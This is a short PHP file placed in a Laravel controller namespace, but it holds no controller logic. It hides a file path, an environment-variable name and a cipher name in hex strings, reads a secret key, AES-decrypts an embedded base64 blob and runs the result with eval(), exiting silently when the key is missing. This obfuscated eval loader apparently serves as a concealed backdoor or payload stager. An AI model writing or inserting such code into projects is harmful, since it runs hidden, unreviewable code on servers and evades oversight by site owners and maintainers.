<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jUuq/EqLgy8nR4AyXjk/CA==');

$c=base64_decode(

'3dQkXO9Y1YxbfmyGNiB7NjCnm1yAYxjwDjBMuY9Sg86Ayfek2WK+TuVwdNw+aOGXzyoN6/MOnkBa' .
'YCIiyJjmPs4OMLcH62F1u+rURuCH/oA7lgd0ijo9k1ei7cL3H5buOW4mSmysPqFy9Exqoq/g0vwc' .
'795Gn+oPtm4o0f9sGyqwueyOW9kMilYS3mj+BFy0l0m/CzbgpLTXhB6VQMYreJrSsExf4jniOz7d' .
'M7Zflxn1avNhf6/53+/zzGsC7lJDBtvE2UbtkegmaR4NyQio7g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

